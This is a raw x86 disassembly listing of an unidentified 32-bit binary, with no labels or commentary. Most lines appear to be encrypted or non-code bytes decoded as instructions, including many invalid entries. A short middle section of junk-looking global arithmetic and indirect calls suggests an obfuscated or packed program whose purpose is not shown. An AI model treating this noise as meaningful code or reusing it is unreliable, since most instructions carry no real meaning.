  40222d:	sbb    BYTE PTR [eax+0x43],cl
  402230:	fs das 
  402232:	xor    al,0xa1
  402234:	or     edi,eax
  402236:	dec    ebx
  402237:	pop    edi
  402238:	(bad)
  40223c:	jmp    0xcf6f:0x22b97537
  402243:	inc    eax
  402244:	adc    DWORD PTR [edx-0x6ffd30c5],ebp
  40224a:	inc    edx
  40224b:	fistp  WORD PTR [eax-0x29aa9e99]
  402251:	loope  0x402272
  402253:	outs   dx,BYTE PTR ds:[esi]
  402254:	and    ebp,DWORD PTR [esi-0x1b]
  402257:	repz aas 
  402259:	mov    ?,WORD PTR [eax+0x4dfdfb38]
  40225f:	pop    eax
  402260:	ins    DWORD PTR es:[edi],dx
  402261:	lods   al,BYTE PTR ds:[esi]
  402262:	aam    0x90
  402264:	cmp    esi,DWORD PTR [ebx+0x574e6594]
  40226a:	pop    ss
  40226b:	into   
  40226c:	loop   0x40221c
  40226e:	pop    ds
  40226f:	loopne 0x402259
  402271:	aas    
  402272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402273:	inc    esi
  402274:	mov    edx,0x2cd903f
  402279:	lahf   
  40227a:	call   0x29bd913d
  40227f:	lods   eax,DWORD PTR ds:[esi]
  402280:	jb     0x4022ba
  402282:	(bad)  
  402283:	push   edx
  402284:	jae    0x4022ab
  402286:	mov    ss,WORD PTR [edx]
  402288:	fwait
  402289:	or     cl,BYTE PTR [eax+edx*4-0x14]
  40228d:	or     edi,DWORD PTR [ebx+0x39]
  402290:	ret    
  402291:	add    si,WORD PTR [edx+0x7bbbfdda]
  402298:	mov    ds:0xc5b1032e,eax
  40229d:	daa    
  40229e:	jns    0x40230f
  4022a0:	imul   ebx,DWORD PTR [edx],0xeb952520
  4022a6:	pusha  
  4022a7:	adc    eax,0xce37c9a5
  4022ac:	hlt    
  4022ad:	mov    eax,ds:0xf0cb8812
  4022b2:	rcr    BYTE PTR [esi+0x1a],1
  4022b5:	int    0x8c
  4022b7:	sar    DWORD PTR [esi],1
  4022b9:	loopne 0x4022a2
  4022bb:	xchg   BYTE PTR [ebx+0x3a2bbd6d],bl
  4022c1:	inc    di
  4022c3:	bsf    eax,DWORD PTR [edx-0xbd8d457]
  4022ca:	fwait
  4022cb:	jnp    0x402321
  4022cd:	aaa    
  4022ce:	fwait
  4022cf:	sbb    eax,0x5bf9cfa8
  4022d4:	gs pop ebx
  4022d6:	pop    ecx
  4022d7:	addr16 pop esi
  4022d9:	push   eax
  4022da:	(bad)  
  4022dc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	and    ebp,DWORD PTR [eax+0x52]
  4022e1:	es push ebx
  4022e3:	es data16 mov bp,si
  4022e8:	and    dl,BYTE PTR [edi]
  4022ea:	xchg   BYTE PTR [edi+0x25],cl
  4022ed:	xchg   esp,eax
  4022ee:	push   esi
  4022ef:	add    ah,0x55
  4022f2:	iret   
  4022f3:	dec    edi
  4022f4:	int    0xa3
  4022f6:	mov    DWORD PTR [edx+0x67],edi
  4022f9:	loop   0x40230b
  4022fb:	mov    dl,0xab
  4022fd:	jns    0x40234a
  4022ff:	jo     0x40233e
  402301:	xchg   edx,eax
  402302:	pop    ebx
  402303:	iret   
  402304:	xor    eax,DWORD PTR [eax]
  402306:	clc    
  402307:	fistp  DWORD PTR [edx-0x76c52698]
  40230d:	ror    BYTE PTR [eax+0x17375146],1
  402313:	push   ds
  402314:	and    cl,bh
  402316:	(bad)  
  402317:	mov    cl,0xd3
  402319:	js     0x4022a4
  40231b:	aad    0x90
  40231d:	mov    bl,0xba
  40231f:	jge    0x4022bb
  402321:	xchg   DWORD PTR [edi+0x2],ecx
  402324:	aam    0x14
  402326:	mov    BYTE PTR ds:0xf511ea5e,dl
  40232c:	aam    0x9a
  40232e:	test   DWORD PTR [eax-0x69],esi
  402331:	popa   
  402332:	push   ebx
  402333:	sbb    DWORD PTR [ebx],esp
  402335:	rol    BYTE PTR [ebp-0x43],0x3
  402339:	test   BYTE PTR ds:0x81634c75,0xc5
  402340:	pop    eax
  402341:	sub    dl,cl
  402343:	shl    DWORD PTR [edx],0x66
  402346:	sub    ebp,DWORD PTR [ebp+0x19]
  402349:	mov    ebx,0xfc9dff7d
  40234e:	and    esi,DWORD PTR [edi]
  402350:	or     DWORD PTR [ecx],ebp
  402352:	in     eax,0x43
  402354:	inc    ebx
  402355:	jno    0x4022f6
  402357:	pop    esp
  402358:	shr    DWORD PTR [eax],1
  40235a:	pop    ebx
  40235b:	inc    eax
  40235c:	pop    es
  40235d:	test   BYTE PTR [ebp+0x3e],al
  402360:	in     al,0x35
  402362:	dec    esp
  402363:	ret    
  402364:	pushf  
  402365:	imul   esi,DWORD PTR [eax],0x161248ca
  40236b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236c:	mov    esp,0xe27d53c4
  402371:	loopne 0x4023c7
  402373:	out    0xa2,eax
  402375:	add    DWORD PTR [ecx-0x1774e330],ebx
  40237b:	in     al,dx
  40237c:	jb     0x4023fb
  40237e:	and    BYTE PTR [edi+0x4a9b6f64],dl
  402384:	mov    esi,0xdd05fe8c
  402389:	jns    0x4023f6
  40238b:	dec    edx
  40238c:	xor    ecx,ebx
  40238e:	add    BYTE PTR [eax+0x16d9bf11],ch
  402394:	or     eax,0x47965602
  402399:	in     al,0x3b
  40239b:	(bad)  
  40239c:	ss push edi
  40239e:	loop   0x4023f8
  4023a0:	out    dx,eax
  4023a1:	cdq    
  4023a2:	cli    
  4023a3:	ror    DWORD PTR [ebx],0x2
  4023a6:	mov    bh,0x42
  4023a8:	push   es
  4023a9:	(bad)  
  4023aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ab:	jp     0x4023a9
  4023ad:	ja     0x402379
  4023af:	stc    
  4023b0:	call   0x54c11d96
  4023b5:	imul   esi,DWORD PTR [ebp-0x76],0x33856663
  4023bc:	outs   dx,DWORD PTR ds:[esi]
  4023bd:	cmp    al,0xd2
  4023bf:	sub    dh,BYTE PTR [eax+0x3bf4d4e7]
  4023c5:	ins    BYTE PTR es:[edi],dx
  4023c6:	addr16 sbb eax,0xf25840e7
  4023cc:	jp     0x40243f
  4023ce:	jecxz  0x402417
  4023d0:	cmp    dh,BYTE PTR [ebx-0x61]
  4023d3:	cmp    eax,0xcee820d
  4023d8:	data16 daa 
  4023da:	idiv   BYTE PTR [ebp+0x2f]
  4023dd:	into   
  4023de:	mov    edx,0xfb4409b8
  4023e3:	xlat   BYTE PTR ds:[ebx]
  4023e4:	dec    edi
  4023e5:	xchg   edi,eax
  4023e6:	or     eax,0xd11834c9
  4023eb:	in     eax,0x51
  4023ed:	xor    BYTE PTR [eax+esi*8-0x34691cd2],al
  4023f4:	ret    
  4023f5:	shl    BYTE PTR [edi+0x68],0x28
  4023f9:	ficom  WORD PTR [edx+0x56]
  4023fc:	mov    edx,0xb8e4ab89
  402401:	imul   eax,DWORD PTR [esi-0x3342e0e8],0x3a
  402408:	in     al,0x78
  40240a:	sub    BYTE PTR [esp+edi*4-0x74a90adb],bh
  402411:	outs   dx,BYTE PTR ds:[esi]
  402412:	xchg   esi,eax
  402413:	int    0xc1
  402415:	loop   0x402483
  402417:	adc    bl,BYTE PTR [eax-0x4b587d88]
  40241d:	push   0x15dbaf58
  402422:	neg    ch
  402424:	xor    cl,BYTE PTR [esp+ecx*8]
  402427:	shl    esi,0x54
  40242a:	adc    eax,0x62f664da
  40242f:	cmc    
  402430:	jnp    0x402403
  402432:	mov    BYTE PTR ds:0x6b609d31,bh
  402438:	mov    WORD PTR [ebp+0x6ebf1dbb],?
  40243e:	pop    edi
  40243f:	data16 mov al,0x70
  402442:	stos   BYTE PTR es:[edi],al
  402443:	adc    dh,ch
  402445:	dec    esi
  402446:	mov    bh,0xec
  402448:	aad    0xd1
  40244a:	leave  
  40244b:	or     DWORD PTR [eax+0x1670c0d9],eax
  402451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402452:	aam    0x28
  402454:	mov    eax,0x3197034
  402459:	adc    bl,BYTE PTR [eax+0x54]
  40245c:	sub    DWORD PTR [ebx+0x15],esp
  40245f:	(bad)  
  402460:	xor    eax,ebx
  402462:	adc    eax,DWORD PTR [ebx]
  402464:	jo     0x4024b9
  402466:	push   cs
  402467:	mov    edi,0x4c5cdc9d
  40246c:	add    DWORD PTR [esp+eax*2+0x283d6388],0xffffffb1
  402474:	sbb    DWORD PTR [esp+ebp*4],0x41
  402478:	and    ch,BYTE PTR [edx-0x6e]
  40247b:	sub    BYTE PTR [eax+0x13f6d437],bl
  402481:	leave  
  402482:	jb     0x4024d8
  402484:	aam    0xed
  402486:	sbb    eax,0x5e67208
  40248b:	mov    ebp,0xfd725174
  402490:	les    ebp,FWORD PTR [edi]
  402492:	mov    ah,0x19
  402494:	enter  0xa0c8,0x34
  402498:	dec    ecx
  402499:	lea    edx,[esi-0x6f]
  40249c:	dec    esp
  40249d:	inc    BYTE PTR [ebx-0x1b]
  4024a0:	sbb    BYTE PTR [ebx+0x1b],ch
  4024a3:	mov    ds:0xc14d8a2d,eax
  4024a8:	jmp    0x267d0cc8
  4024ad:	enter  0xeae5,0xa4
  4024b1:	jns    0x402452
  4024b3:	arpl   bp,dx
  4024b5:	fs int 0xc9
  4024b8:	and    eax,DWORD PTR [edi]
  4024ba:	xor    BYTE PTR [eax],al
  4024bc:	loopne 0x40246f
  4024be:	xor    ebp,DWORD PTR [eax+0x388ce1ea]
  4024c4:	loopne 0x402513
  4024c6:	inc    eax
  4024c7:	mov    ds:0xce226536,eax
  4024cc:	mov    bh,0x99
  4024ce:	imul   ebx,DWORD PTR [edi+edx*2+0x3c47f935],0xffffffdf
  4024d6:	jmp    0xe176b06f
  4024db:	test   al,0xdc
  4024dd:	out    0x9,eax
  4024df:	test   al,0xd3
  4024e1:	les    edi,FWORD PTR [eax+0x6c]
  4024e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e5:	mov    eax,ds:0x2ba4848c
  4024ea:	dec    eax
  4024eb:	sbb    BYTE PTR [ecx-0x6e],al
  4024ee:	inc    ebx
  4024ef:	lds    edi,FWORD PTR [edx-0x7a]
  4024f2:	retf   
  4024f3:	xor    eax,0xb2b3cad7
  4024f8:	mov    eax,ds:0x4a916385
  4024fd:	jmp    0x3161:0x389e33ae
  402504:	push   es
  402505:	push   ebx
  402506:	jo     0x402573
  402508:	je     0x40248b
  40250a:	stos   BYTE PTR es:[edi],al
  40250b:	pop    edx
  40250c:	xchg   esp,eax
  40250d:	bound  eax,QWORD PTR [ecx]
  40250f:	push   edi
  402510:	jmp    0x7575:0x3bd68cb4
  402517:	jb     0x402504
  402519:	mov    eax,?
  40251b:	int    0x72
  40251d:	mov    eax,0x5b0453bb
  402522:	les    eax,FWORD PTR [edx]
  402524:	sahf   
  402525:	or     ah,BYTE PTR [esi-0x48cc1a36]
  40252b:	xchg   ecx,eax
  40252c:	shl    BYTE PTR [ebp-0x3c],cl
  40252f:	stc    
  402530:	cmc    
  402531:	push   ecx
  402532:	mov    ebx,DWORD PTR [edi-0x1d]
  402535:	fbstp  TBYTE PTR [ebx+0x6b4d6904]
  40253b:	cwde   
  40253c:	fisttp WORD PTR [ebp-0x4a]
  40253f:	adc    BYTE PTR [di],dl
  402542:	fbstp  TBYTE PTR [edx+ecx*8]
  402545:	or     ebx,edx
  402547:	add    eax,DWORD PTR [esi-0x58]
  40254a:	in     al,dx
  40254b:	push   0xffffffda
  40254d:	pop    esp
  40254e:	cmp    al,0xa4
  402550:	repz pop esi
  402552:	fistp  DWORD PTR [eax+0x36]
  402555:	test   BYTE PTR [edx+0xafee8d6],bh
  40255b:	xor    eax,DWORD PTR [ebx-0x29de868d]
  402561:	outs   dx,BYTE PTR ds:[esi]
  402562:	(bad)  
  402563:	sub    DWORD PTR [esi-0x4f0c5f2],ecx
  402569:	cwde   
  40256a:	pop    eax
  40256b:	rcl    ah,0x18
  40256e:	mov    dh,0x36
  402570:	jp     0x402565
  402572:	into   
  402573:	mov    ds:0xdcdaf667,eax
  402578:	rcl    BYTE PTR [ebp-0x5a7fde48],cl
  40257e:	daa    
  40257f:	xchg   ebx,eax
  402580:	xchg   ebp,eax
  402581:	adc    DWORD PTR [edx+0x482d715e],esi
  402587:	and    eax,0x697a5368
  40258c:	pop    esi
  40258d:	loop   0x402607
  40258f:	out    dx,eax
  402590:	lock ins DWORD PTR es:[edi],dx
  402592:	push   edx
  402593:	dec    ecx
  402594:	push   ss
  402595:	mov    ebx,0x26467cb0
  40259a:	ret    0xf977
  40259d:	inc    edx
  40259e:	add    BYTE PTR [edx],al
  4025a0:	jbe    0x40253d
  4025a2:	pop    ebp
  4025a3:	ret    
  4025a4:	lds    edi,FWORD PTR [edi]
  4025a6:	and    DWORD PTR [edi+0x6cd1d6eb],ebx
  4025ac:	ja     0x4025d0
  4025ae:	lods   al,BYTE PTR ds:[esi]
  4025af:	mov    dl,0x1a
  4025b1:	and    ebp,DWORD PTR [edi]
  4025b3:	(bad)  
  4025b4:	mov    ebp,0x5f5dfdcc
  4025b9:	pop    ds
  4025ba:	int    0x52
  4025bc:	aas    
  4025bd:	jecxz  0x4025c7
  4025bf:	adc    eax,0x2b6e8242
  4025c4:	mov    al,0xcd
  4025c6:	in     al,dx
  4025c7:	sbb    edi,edx
  4025c9:	fidivr DWORD PTR [ebx-0x38010474]
  4025cf:	inc    ebp
  4025d0:	nop
  4025d1:	jb     0x40260e
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	movzx  eax,WORD PTR ds:0x4282ff
  4025dc:	adc    DWORD PTR ds:0x42818b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428173,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428167,0x0
  4025fd:	mov    DWORD PTR ds:0x428313,0x76b5
  402607:	mov    DWORD PTR ds:0x42816f,edx
  40260d:	mov    DWORD PTR ds:0x428287,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428273
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428167,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42823f
  402645:	call   DWORD PTR ds:0x428d9c
  40264b:	sbb    DWORD PTR ds:0x42838b,0x36f
  402655:	adc    DWORD PTR ds:0x42830f,0x428197
  40265f:	sub    DWORD PTR ds:0x42837f,0x42831b
  402669:	and    DWORD PTR ds:0x42815f,0x42824b
  402673:	add    DWORD PTR ds:0x42831f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428167
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42815b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42828f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282ef,edx
  4026bd:	mov    DWORD PTR ds:0x42824b,ecx
  4026c3:	mov    DWORD PTR ds:0x428173,edx
  4026c9:	mov    DWORD PTR ds:0x42826f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42815b
  4026dd:	mov    DWORD PTR ds:0x42828f,edx
  4026e3:	cmp    DWORD PTR ds:0x42828f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428da0
  402708:	add    DWORD PTR ds:0x428297,0x4282f7
  402712:	sub    DWORD PTR ds:0x428313,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42816b,0x16a6
  402726:	dec    DWORD PTR ds:0x428187
  40272c:	and    DWORD PTR ds:0x42826b,edx
  402732:	or     DWORD PTR ds:0x4282fb,edx
  402738:	mov    eax,ds:0x42818f
  40273d:	and    DWORD PTR ds:0x4283a3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283a3
  402751:	sbb    DWORD PTR ds:0x42826f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42824f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428303
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x43b67baa
  4027a0:	push   0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    bh,dh
  4027aa:	arpl   ax,cx
  4027ac:	mov    BYTE PTR es:[esi-0x507fbe38],0xd8
  4027b4:	int3   
  4027b5:	and    DWORD PTR [edi+0x7209ea1e],edx
  4027bb:	jecxz  0x40283a
  4027bd:	test   BYTE PTR [edx],0xd3
  4027c0:	adc    DWORD PTR [ecx],edx
  4027c2:	in     eax,0x76
  4027c4:	xor    BYTE PTR [ebx],ch
  4027c6:	and    bh,dl
  4027c8:	cdq    
  4027c9:	dec    esi
  4027ca:	cmp    edx,DWORD PTR ds:0x3bca6baa
  4027d0:	sti    
  4027d1:	rcr    edx,cl
  4027d3:	sbb    BYTE PTR [ebx-0x61],0x51
  4027d7:	xor    eax,0xd0068a19
  4027dc:	test   BYTE PTR [edi+0x5a],ah
  4027df:	imul   ebp,DWORD PTR [esi-0x22],0xf5624dd
  4027e6:	mov    eax,ds:0x786c712d
  4027eb:	add    eax,0xe2a51da9
  4027f0:	mov    ds:0x4a0531f5,al
  4027f5:	mov    ds:0xdbd21849,eax
  4027fa:	lahf   
  4027fb:	nop
  4027fc:	sbb    al,0x7d
  4027fe:	cmc    
  4027ff:	add    bh,BYTE PTR [edx]
  402801:	xchg   esp,eax
  402802:	sahf   
  402803:	dec    eax
  402804:	fld    DWORD PTR [edi-0x47]
  402807:	dec    ebx
  402808:	(bad)  
  402809:	sbb    BYTE PTR [ebp-0x17],ah
  40280c:	scas   al,BYTE PTR es:[edi]
  40280d:	mov    eax,0xba93cd81
  402812:	out    dx,eax
  402813:	mov    eax,0x86a34d0b
  402818:	stos   DWORD PTR es:[edi],eax
  402819:	cli    
  40281a:	jecxz  0x4027af
  40281c:	hlt    
  40281d:	inc    ebx
  40281e:	ficom  DWORD PTR [eax]
  402820:	and    BYTE PTR [eax],dl
  402822:	out    dx,al
  402823:	fsub   QWORD PTR [ecx+0x73]
  402826:	mov    ecx,0x99ed36b2
  40282b:	add    esi,DWORD PTR [ecx-0x6a]
  40282e:	dec    ecx
  40282f:	rcr    edx,0xea
  402832:	popa   
  402833:	cli    
  402834:	and    edi,ecx
  402836:	push   ss
  402837:	dec    ebx
  402838:	jmp    0x7864:0xdf8c1f3c
  40283f:	pop    es
  402840:	rol    DWORD PTR [edx+0x6855179],1
  402846:	add    esi,DWORD PTR [eax+0x2abda2f3]
  40284c:	sub    al,0x1a
  40284e:	xor    ah,BYTE PTR [eax+0x7b65272c]
  402854:	xor    BYTE PTR [ebp-0x54],0xea
  402858:	mov    eax,0x2c6fe7e2
  40285d:	gs ret 0x43ce
  402861:	mov    ecx,0x80d226db
  402866:	scas   al,BYTE PTR es:[edi]
  402867:	sahf   
  402868:	xchg   ebx,eax
  402869:	loopne 0x4028c4
  40286b:	cmp    dh,BYTE PTR [esi+0x44]
  40286e:	imul   ebp,DWORD PTR [ebp-0x4e0b53f1],0x13
  402875:	xchg   DWORD PTR [edx],esp
  402877:	das    
  402878:	xchg   BYTE PTR [ebx+0x4c],dh
  40287b:	mov    dh,0x6d
  40287d:	call   0x55f9:0x553061d3
  402884:	icebp  
  402885:	sub    al,0x5a
  402887:	sbb    BYTE PTR [ebp+0x50],ah
  40288a:	outs   dx,BYTE PTR ds:[esi]
  40288b:	out    0x15,al
  40288d:	jae    0x4028d8
  40288f:	in     al,0xfe
  402891:	sub    bl,BYTE PTR [ecx+0x22258554]
  402897:	lfs    ebp,FWORD PTR [eax-0x77]
  40289b:	jmp    0x40287d
  40289d:	(bad)  
  40289e:	(bad)  
  40289f:	sti    
  4028a0:	pop    ecx
  4028a1:	xchg   esi,eax
  4028a2:	repz mov bh,0x5b
  4028a5:	in     al,0xd8
  4028a7:	add    DWORD PTR [edi],edi
  4028a9:	lahf   
  4028aa:	inc    ecx
  4028ab:	xchg   esp,eax
  4028ac:	test   al,0xc6
  4028ae:	je     0x4028c9
  4028b0:	int3   
  4028b1:	dec    edi
  4028b2:	sub    DWORD PTR [eax+0x62ad0d3a],0x1e687e06
  4028bc:	aam    0x84
  4028be:	or     bl,cl
  4028c0:	xchg   esi,eax
  4028c1:	jne    0x4028af
  4028c3:	and    eax,0xfb7e3ad8
  4028c8:	jns    0x4028fc
  4028ca:	leave  
  4028cb:	push   esp
  4028cc:	inc    edi
  4028cd:	gs inc esp
  4028cf:	mov    al,0xfc
  4028d1:	mov    ecx,0x48157248
  4028d6:	(bad)  
  4028d8:	xchg   esp,eax
  4028d9:	pop    es
  4028da:	cmp    ah,BYTE PTR [eax-0x78]
  4028dd:	sub    al,0xab
  4028df:	jecxz  0x40291b
  4028e1:	imul   esp,DWORD PTR [ebx-0x6a],0xffffffc7
  4028e5:	ja     0x4028bc
  4028e7:	loope  0x40295a
  4028e9:	fistp  DWORD PTR [ebp+0x44e2db6a]
  4028ef:	loopne 0x4028b2
  4028f1:	sbb    edx,ebp
  4028f3:	sub    ecx,ebx
  4028f5:	(bad)  [ecx]
  4028f7:	imul   edx,DWORD PTR [ecx-0x53e3d59],0x5e
  4028fe:	call   0xfb2abeef
  402903:	frstor [ecx]
  402905:	ret    0x63c4
  402908:	adc    al,0xf9
  40290a:	inc    ebp
  40290b:	(bad)  
  40290c:	fcmovbe st,st(6)
  40290e:	xchg   ecx,eax
  40290f:	ins    BYTE PTR es:[edi],dx
  402910:	sub    DWORD PTR [esi-0x1ec00f56],0x7a
  402917:	cs sub esi,eax
  40291a:	mov    ch,0xed
  40291c:	push   eax
  40291d:	xor    BYTE PTR [edi+0x19],0x2e
  402921:	pop    ecx
  402922:	or     ecx,DWORD PTR [edx]
  402924:	add    cl,BYTE PTR [eax-0x39]
  402927:	scas   al,BYTE PTR es:[edi]
  402928:	ins    DWORD PTR es:[edi],dx
  402929:	sbb    BYTE PTR [ebp+0xc],0x0
  40292d:	mov    bh,0xc2
  40292f:	adc    BYTE PTR [ebp-0x17c2b8af],dh
  402935:	clc    
  402936:	addr16 out 0x97,eax
  402939:	adc    bl,dl
  40293b:	cmc    
  40293c:	ror    DWORD PTR [edi],0x38
  40293f:	mov    edx,0xa18d51d8
  402944:	or     ebp,ebx
  402946:	mov    bh,0x8f
  402948:	addr16 dec ebp
  40294a:	dec    ebx
  40294b:	fistp  QWORD PTR [ebx]
  40294d:	xchg   edx,eax
  40294e:	mov    eax,ds:0xd2e5f5c6
  402953:	add    DWORD PTR [ebx+0x3611cf2],esp
  402959:	pop    ds
  40295a:	dec    esi
  40295b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40295c:	jge    0x4029d8
  40295e:	and    al,0x28
  402960:	sbb    DWORD PTR [eax+0x60],esi
  402963:	ins    DWORD PTR es:[edi],dx
  402964:	cmovl  ecx,esi
  402967:	(bad)  
  402968:	xchg   ebp,eax
  402969:	ret    0x450d
  40296c:	pop    ebp
  40296d:	pop    esp
  40296e:	and    esi,DWORD PTR [esi+0x562b055a]
  402974:	cmp    al,0x45
  402976:	cwde   
  402977:	sub    edx,0x9df8b0cf
  40297d:	es cdq 
  40297f:	adc    ch,dh
  402981:	sub    ebp,esi
  402983:	jb     0x4029d7
  402985:	add    BYTE PTR ss:[esi-0x199dedba],bl
  40298c:	lds    ecx,FWORD PTR [ecx-0x61]
  40298f:	mov    edx,0x2e4a2e21
  402994:	loopne 0x40293a
  402996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402997:	lahf   
  402998:	xchg   ebx,eax
  402999:	in     al,dx
  40299a:	sub    eax,0xdb324c78
  40299f:	inc    edi
  4029a1:	fstp   TBYTE PTR [ecx-0x2431bc25]
  4029a7:	sbb    al,0x4b
  4029a9:	push   cs
  4029aa:	mov    dh,0xfc
  4029ac:	cdq    
  4029ad:	cmp    al,0xf2
  4029af:	mov    edx,0x98248ba2
  4029b4:	call   0x7e91:0xa38b865
  4029bb:	repz cmp al,0xb4
  4029be:	and    edi,eax
  4029c0:	sub    eax,0xdc1e6a67
  4029c5:	xchg   BYTE PTR [ebp+ecx*1-0x4f02a833],cl
  4029cc:	(bad)  
  4029cd:	mov    ch,0xe2
  4029cf:	jg     0x402a10
  4029d1:	xchg   ebx,eax
  4029d2:	push   ebp
  4029d3:	cld    
  4029d4:	rcl    DWORD PTR [ecx],1
  4029d6:	aad    0x6a
  4029d8:	shl    al,1
  4029da:	cli    
  4029db:	inc    edi
  4029dc:	push   ecx
  4029dd:	call   0x11b5ca10
  4029e2:	add    ebp,DWORD PTR ds:0x33a6ff55
  4029e8:	hlt    
  4029e9:	iret   
  4029ea:	aad    0x58
  4029ec:	xor    bh,BYTE PTR [eax+0x12505944]
  4029f2:	mov    ds:0x2b1b1366,al
  4029f7:	arpl   WORD PTR [edi+0x10ce9aeb],dx
  4029fd:	mov    bl,0xdc
  4029ff:	mov    bh,0xdb
  402a01:	mov    ah,0x78
  402a03:	jge    0x402a27
  402a05:	popa   
  402a06:	push   es
  402a07:	xchg   ebp,eax
  402a08:	nop
  402a09:	popa   
  402a0a:	mov    dl,0xa5
  402a0c:	mov    cl,0x34
  402a0e:	fsub   DWORD PTR [ebx+0x6d62660]
  402a14:	mov    fs,esp
  402a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a17:	fdivr  st,st(1)
  402a19:	test   BYTE PTR [edi-0x16],bl
  402a1c:	mov    dl,0x98
  402a1e:	jns    0x402a0a
  402a20:	gs call 0x7ed697d7
  402a26:	outs   dx,DWORD PTR ds:[esi]
  402a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a28:	jbe    0x402a37
  402a2a:	or     eax,DWORD PTR [ebp+0x581b6ab9]
  402a30:	iret   
  402a31:	jp     0x402a51
  402a33:	not    DWORD PTR [ebp+0x2d2498ce]
  402a39:	jmp    0x7f2174
  402a3e:	std    
  402a3f:	std    
  402a40:	or     DWORD PTR [edx-0x57],ecx
  402a43:	jnp    0x4029db
  402a45:	jl     0x402abc
  402a47:	dec    ebx
  402a48:	mov    ds:0x4fbe9242,al
  402a4d:	mov    ebp,0x929b1c33
  402a52:	sub    esp,DWORD PTR [edi]
  402a54:	call   0x15cd3db3
  402a59:	jmp    0x402a5d
  402a5b:	adc    DWORD PTR [edi-0x60],ecx
  402a5e:	aas    
  402a5f:	push   eax
  402a60:	sbb    DWORD PTR [eax-0x36],0xffffffc6
  402a64:	call   0x9d1d0779
  402a69:	dec    edi
  402a6a:	lods   al,BYTE PTR ds:[esi]
  402a6b:	add    BYTE PTR [ebx],bh
  402a6d:	ds pusha 
  402a6f:	sti    
  402a70:	fsub   QWORD PTR [edx+0x638159da]
  402a76:	ja     0x402a0e
  402a78:	adc    BYTE PTR [edi+esi*1-0x2bc0f8f5],dh
  402a7f:	adc    eax,0x81f77ed8
  402a84:	retf   0xf377
  402a87:	(bad)  
  402a88:	mov    al,0x63
  402a8a:	sub    cl,BYTE PTR [ebx]
  402a8c:	in     al,0x34
  402a8e:	(bad)  
  402a8f:	fild   DWORD PTR [edx-0x7e]
  402a92:	xchg   BYTE PTR [eax+0x41e0b8c4],ch
  402a98:	sub    edx,ebp
  402a9a:	dec    ecx
  402a9b:	cmp    ah,cl
  402a9d:	test   al,0xf5
  402a9f:	sbb    DWORD PTR [eax-0x75],ecx
  402aa2:	icebp  
  402aa3:	mov    ebp,0xe6a6ef8e
  402aa8:	xchg   ebx,eax
  402aa9:	fdiv   st,st(5)
  402aab:	ds test edx,ecx
  402aae:	out    dx,al
  402aaf:	stc    
  402ab0:	outs   dx,DWORD PTR ds:[esi]
  402ab1:	stc    
  402ab2:	mov    esi,0xa341ce08
  402ab7:	stc    
  402ab8:	fbstp  TBYTE PTR fs:[ecx-0x65c8d1b1]
  402abf:	cdq    
  402ac0:	push   esp
  402ac1:	push   ss
  402ac2:	xlat   BYTE PTR ds:[ebx]
  402ac3:	mov    DWORD PTR [eax+0x26],ebx
  402ac6:	retf   
  402ac7:	sub    BYTE PTR [esi+edi*1+0x4a],bl
  402acb:	mov    ah,0xf7
  402acd:	outs   dx,DWORD PTR ds:[esi]
  402ace:	in     al,0x4
  402ad0:	out    dx,eax
  402ad1:	mov    ecx,0x97367383
  402ad6:	jo     0x402a5b
  402ad8:	push   ds
  402ad9:	cmp    BYTE PTR [edi-0x26b3b5fa],al
  402adf:	scas   eax,DWORD PTR es:[edi]
  402ae0:	sbb    BYTE PTR [edi+0x8],dl
  402ae3:	xor    bl,BYTE PTR [eax]
  402ae5:	jg     0x402abd
  402ae7:	lahf   
  402ae8:	aam    0x7c
